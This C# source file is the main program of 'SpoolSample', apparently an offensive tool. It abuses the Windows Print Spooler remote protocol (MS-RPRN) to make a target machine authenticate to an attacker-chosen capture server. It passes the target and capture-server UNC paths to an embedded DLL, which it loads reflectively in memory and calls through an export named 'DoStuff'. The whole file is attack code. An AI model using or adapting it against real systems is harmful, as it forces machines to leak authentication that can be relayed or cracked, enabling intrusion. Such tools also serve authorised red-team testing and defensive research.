using System;
using System.Text;
using RDI;

namespace SpoolSample
{
    class SpoolSample
    {
        // FYI, there might be reliability issues with this. The MS-RPRN project is more reliable 
        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Invalid number of args. Syntax: SpoolSample.exe TARGET CAPTURESERVER");
                return;
            }

            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{args[0]} \\\\{args[1]}");
            
            RDILoader.CallExportedFunction(Data.RprnDll, "DoStuff", commandBytes);
        }
    }
}
